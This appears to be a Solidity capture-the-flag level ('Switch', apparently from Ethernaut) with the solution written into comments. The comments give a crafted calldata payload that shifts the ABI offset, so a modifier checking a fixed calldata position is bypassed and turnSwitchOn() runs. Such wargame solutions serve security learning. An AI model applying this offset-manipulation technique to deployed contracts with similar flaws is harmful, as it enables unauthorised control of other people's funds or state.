// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    //to get the hex -> 0x76227e12
    bytes4 public onSelector = bytes4(keccak256("turnSwitchOn()"));

    // 30c13ade -> function selector for flipSwitch(bytes memory data)
    // 0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field
    // 0000000000000000000000000000000000000000000000000000000000000000 -> empty stuff so we can have bytes4(keccak256("turnSwitchOff()")) at 64 bytes
    // 20606e1500000000000000000000000000000000000000000000000000000000 -> bytes4(keccak256("turnSwitchOff()"))
    // 0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
    // 76227e1200000000000000000000000000000000000000000000000000000000 -> functin selector for turnSwitchOn()

    // Remix Low level interactions Menu: Calldata with fallback()
    // or
    // bytes memory callData =
    //     hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
    // address(level).call(callData);

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }

    fallback() external { }
}